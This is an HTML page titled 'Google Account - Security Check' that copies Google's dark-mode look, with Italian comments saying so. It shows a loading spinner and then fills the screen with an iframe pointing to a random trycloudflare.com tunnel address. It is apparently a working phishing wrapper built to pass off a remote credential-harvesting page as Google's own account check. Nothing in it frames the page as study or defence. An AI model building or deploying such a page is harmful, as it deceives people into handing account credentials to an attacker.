<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#1a1b1e">
    <title>Google Account - Security Check</title>
    <style>
        /* Reset totale dei margini */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Sfondo identico alla Dark Mode originale di Google */
        body, html { 
            height: 100%; 
            width: 100%; 
            overflow: hidden; 
            background-color: #1a1b1e; 
            font-family: 'Roboto', Arial, sans-serif;
        }

        /* Container dell'Iframe: aggiunge lo spazio in alto per l'allineamento */
        .iframe-wrapper {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            /* Questo valore sposta il contenuto verso il basso per non tagliare il logo */
            padding-top: 45px; 
            background-color: #1a1b1e;
            z-index: 2;
        }

        iframe { 
            width: 100%; 
            height: 100%; 
            border: none; 
            display: block;
            background-color: transparent;
        }

        /* Animazione di caricamento professionale su sfondo scuro */
        .loader-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1; /* Resta dietro l'iframe-wrapper */
            background-color: #1a1b1e;
        }

        .spinner {
            border: 3px solid #333;
            border-top: 3px solid #4285F4;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .loading-text {
            color: #9aa0a6; 
            margin-top: 20px; 
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="spinner"></div>
        <p class="loading-text">One moment...</p>
    </div>

    <div class="iframe-wrapper">
        <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com"></iframe>
    </div>

</body>
</html>
